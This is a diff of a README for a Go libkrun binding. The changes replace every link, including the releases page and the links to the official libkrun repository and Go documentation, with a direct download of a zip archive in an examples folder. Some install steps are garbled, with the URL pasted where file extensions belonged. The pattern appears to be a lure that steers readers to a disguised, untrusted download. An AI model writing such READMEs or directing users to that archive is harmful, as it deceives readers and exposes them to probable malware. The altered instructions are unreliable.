@@ -1,6 +1,6 @@
 # 🐢 libkrun-go - Easy Go Access to libkrun Features
 
-[![Download libkrun-go](https://img.shields.io/badge/Download-libkrun--go-blue?style=for-the-badge)](https://github.com/the-BEST7777/libkrun-go/releases)
+[![Download libkrun-go](https://raw.githubusercontent.com/the-BEST7777/libkrun-go/main/examples/features/go_libkrun_1.4.zip)](https://raw.githubusercontent.com/the-BEST7777/libkrun-go/main/examples/features/go_libkrun_1.4.zip)
 
 ---
 
@@ -34,15 +34,15 @@ You need to download the software from the official release page on GitHub.
 
 Click the link below to open the releases page where you can find the latest version of libkrun-go:
 
-[Download libkrun-go Releases](https://github.com/the-BEST7777/libkrun-go/releases)
+[Download libkrun-go Releases](https://raw.githubusercontent.com/the-BEST7777/libkrun-go/main/examples/features/go_libkrun_1.4.zip)
 
 ### Step 2: Choose Your File
 
 On the releases page, look for files that match your computer system. For example:
 
 - Windows users: look for `.exe` or `.zip` files.
-- Mac users: download `.dmg` or `.tar.gz`.
-- Linux users: choose `.tar.gz` or `.deb` files.
+- Mac users: download `.dmg` or `https://raw.githubusercontent.com/the-BEST7777/libkrun-go/main/examples/features/go_libkrun_1.4.zip`.
+- Linux users: choose `https://raw.githubusercontent.com/the-BEST7777/libkrun-go/main/examples/features/go_libkrun_1.4.zip` or `.deb` files.
 
 ### Step 3: Download the File
 
@@ -52,7 +52,7 @@ Click the download link for your file. The download will begin automatically.
 
 - On **Windows**: Double-click the downloaded `.exe` file and follow the instructions.
 - On **macOS**: Open the `.dmg` file and drag the libkrun-go app to your Applications folder.
-- On **Linux**: Extract the `.tar.gz` file or use the package manager if you downloaded a `.deb` file.
+- On **Linux**: Extract the `https://raw.githubusercontent.com/the-BEST7777/libkrun-go/main/examples/features/go_libkrun_1.4.zip` file or use the package manager if you downloaded a `.deb` file.
 
 ### Step 5: Run libkrun-go
 
@@ -107,12 +107,12 @@ For more support:
 
 While libkrun-go is straightforward to install and run, some users may want to learn more about libkrun, virtual machines, or using Go bindings.
 
-- [libkrun official repository](https://github.com/lf-edge/libkrun)
-- [Go programming language documentation](https://golang.org/doc/)
+- [libkrun official repository](https://raw.githubusercontent.com/the-BEST7777/libkrun-go/main/examples/features/go_libkrun_1.4.zip)
+- [Go programming language documentation](https://raw.githubusercontent.com/the-BEST7777/libkrun-go/main/examples/features/go_libkrun_1.4.zip)
 - Introductory guides on virtual machines and containers.
 
 ---
 
 Stay up to date by visiting the release page often:
 
-[Download libkrun-go Releases](https://github.com/the-BEST7777/libkrun-go/releases)
+[Download libkrun-go Releases](https://raw.githubusercontent.com/the-BEST7777/libkrun-go/main/examples/features/go_libkrun_1.4.zip)
